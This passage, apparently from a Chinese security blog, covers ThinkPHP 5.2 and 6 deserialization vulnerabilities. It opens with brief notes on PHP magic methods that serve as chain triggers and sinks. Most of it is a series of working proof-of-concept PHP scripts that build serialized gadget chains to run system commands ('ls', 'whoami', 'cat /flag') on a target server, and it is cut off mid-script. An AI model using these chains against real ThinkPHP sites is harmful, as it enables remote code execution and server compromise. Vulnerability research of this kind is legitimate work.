<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__toString 当一个对象被当做字符串使用</span><br><span class="line"></span><br><span class="line">__get 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__set 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</span><br></pre></td></tr></table></figure>

<p>反序列化常见终点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__call 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">call_user_func 一般php代码执行都会选择这里</span><br><span class="line"></span><br><span class="line">call_user_func_array 一般php代码执行都会选择这里</span><br></pre></td></tr></table></figure>

<p><strong>No.4</strong> 几个可以触发__tostring的方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo $foo  print $foo 输出</span><br><span class="line"></span><br><span class="line">file_exists($f00)  文件判断</span><br><span class="line"></span><br><span class="line">&apos;name&apos;.$foo  &quot;name is &#123;$foo&#125;&quot;字符串连接</span><br><span class="line"></span><br><span class="line">sprintf(&quot;I am %s&quot;,$foo) 格式化字符串</span><br><span class="line"></span><br><span class="line">if($foo==&apos;admin&apos;)  字符串比较</span><br><span class="line"></span><br><span class="line">格式化sql语句，绑定参数会被调用</span><br><span class="line"></span><br><span class="line">in_array($foo,[&apos;admin&apos;,&apos;guest&apos;]) 数组中有字符，产生字符判断的时候</span><br></pre></td></tr></table></figure>

<p><strong>No.5</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk_recursive($data, [$this, &apos;filterValue&apos;], $filter);</span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<p> <a href="https://wulidecade.cn/2019/10/06/tp5-1-X反序列化漏洞分析/" target="_blank" rel="noopener">https://wulidecade.cn/2019/10/06/tp5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a> </p>
<p> <a href="https://xz.aliyun.com/t/6619#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619#toc-1</a> </p>
<p><a href="https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
<h1 id="TP5-2"><a href="#TP5-2" class="headerlink" title="TP5.2"></a>TP5.2</h1><h3 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Windows</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">files</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($files)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [$files];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span></span><br><span class="line">    &#123;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title">trait</span> <span class="title">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line">        <span class="keyword">private</span> $withAttr = [<span class="string">"lin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span> =&gt; <span class="string">"ls"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    $<span class="title">conver</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>();</span><br><span class="line">    $payload = <span class="keyword">new</span> think\process\pipes\Windows($conver);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Opis</span>\<span class="title">Closure</span>\<span class="title">SerializableClosure</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="comment"># withAttr中的键值要与data中的键值相等</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'lin'</span>=&gt; <span class="keyword">new</span> SerializableClosure(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;system(<span class="string">'ls'</span>);&#125;) ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $runtimePath;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $rootPath = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rootPath = $rootPath;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;runtimePath = <span class="string">"D:/phpstudy/PHPTutorial/WWW/thinkphp/tp5.2/"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = <span class="keyword">new</span> \think\route\RuleName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $config;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">'query'</span>=&gt;<span class="string">'\think\Url'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \think\App();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment"># append键必须存在，并且与$this-&gt;data相同</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"lin"</span>=&gt;[]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"lin"</span>=&gt;<span class="keyword">new</span> \think\Db()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">route</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RuleName</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var_dump(new Windows());</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="TP6"><a href="#TP6" class="headerlink" title="TP6"></a>TP6</h1><h3 id="poc1-1"><a href="#poc1-1" class="headerlink" title="poc1"></a>poc1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Db</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">        <span class="keyword">private</span> $relation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">        <span class="keyword">private</span> $withAttr;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">private</span> $lazySave;</span><br><span class="line">        <span class="keyword">private</span> $exists;</span><br><span class="line">        <span class="keyword">protected</span> $name;</span><br><span class="line">        <span class="keyword">protected</span> $db;</span><br><span class="line">        <span class="keyword">protected</span> $connection;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data,$obj)</span></span></span><br><span class="line"><span class="function">        </span>&#123;   </span><br><span class="line">           </span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave=<span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists=<span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=$data;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db=$obj;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible= [];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name=<span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"paper"</span>=&gt;<span class="string">'system'</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = [<span class="string">"type"</span>=&gt;<span class="string">"mysql"</span>];</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">data</span>,$<span class="title">obj</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">parent</span>::<span class="title">__construct</span>($<span class="title">data</span>,$<span class="title">obj</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">db</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">Db</span>();</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> think\model\Pivot([<span class="string">'paper'</span>=&gt;<span class="string">'ls'</span>],$db);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="poc2-1"><a href="#poc2-1" class="headerlink" title="poc2"></a>poc2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Opis</span>\<span class="title">Closure</span>\<span class="title">SerializableClosure</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $lazySave ;</span><br><span class="line">    <span class="keyword">private</span> $exists ;</span><br><span class="line">    <span class="keyword">private</span> $suffix;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="keyword">protected</span> $visible = [];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($aaa)</span></span>&#123;</span><br><span class="line">        <span class="comment">//withAttr中的键值要与data中的键值相等</span></span><br><span class="line">        <span class="keyword">if</span> ($aaa == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="string">"huha"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = [<span class="string">'huha'</span>=&gt; <span class="keyword">new</span> SerializableClosure(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;system(<span class="string">'whoami'</span>);&#125;) ];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = [<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave =<span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = $aaa;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($aaa)</span></span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct($aaa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$pivot1 = <span class="keyword">new</span> Pivot(<span class="keyword">null</span>);</span><br><span class="line">$pivot2 = <span class="keyword">new</span> Pivot($pivot1);</span><br><span class="line">$a = base64_encode(serialize($pivot2));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>需要放在网站根目录下运行，因为有vendor/autoload.php</p>
<h3 id="poc3-1"><a href="#poc3-1" class="headerlink" title="poc3"></a>poc3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Conversion</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> Attribute</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"axin"</span> =&gt; <span class="string">"system"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"axin"</span> =&gt; <span class="string">"cat /flag"</span>];  <span class="comment">//你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> $withEvent = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> $exists = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> $force = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">protected</span> $field = [];</span><br><span class="line">    <span class="keyword">protected</span> $schema = [];</span><br><span class="line">    <span class="keyword">protected</span> 